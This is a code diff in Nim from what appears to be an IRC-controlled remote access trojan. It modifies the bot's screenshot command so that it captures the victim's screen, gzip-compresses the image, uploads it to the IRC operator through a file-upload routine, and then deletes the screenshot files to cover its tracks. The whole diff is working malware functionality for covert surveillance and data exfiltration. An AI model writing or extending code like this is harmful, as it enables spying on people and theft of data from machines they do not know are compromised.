@@ -359,18 +359,25 @@ proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
             return
         else:
             await client.privmsg(event.origin,"screenshot was created and was found. trying to upload")
-            var faketokens:seq[string] = @["", $rand_filename & ".bmp"]
+            var
+                bitmap_contents = readFile($rand_filename & ".bmp")
+                bitmap_compress = compress(bitmap_contents)
+            writeFile($rand_filename & ".gz", bitmap_compress)
+
+            var faketokens:seq[string] = @["", $rand_filename & ".gz"]
             await cmd_getFileIO(event, client, faketokens)
             await client.privmsg(event.origin,"starting cleanup")
             if fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
                 removeFile(scrndir & "\\" & $rand_filename & ".bmp")
+            if fileExists(scrndir & "\\" & $rand_filename & ".gz"):
+                removeFile(scrndir & "\\" & $rand_filename & ".gz")
             if dirExists(scrndir):
                 removeDir(scrndir)
             return
     except OSError as e:
         discard client.privmsg(event.origin, "there was trouble while taking the screenshot [" & repr(e) & "]")
     finally:
-        setCurrentDir(current_dir)
+        setCurrentDir(current_dir)  
 
 
 
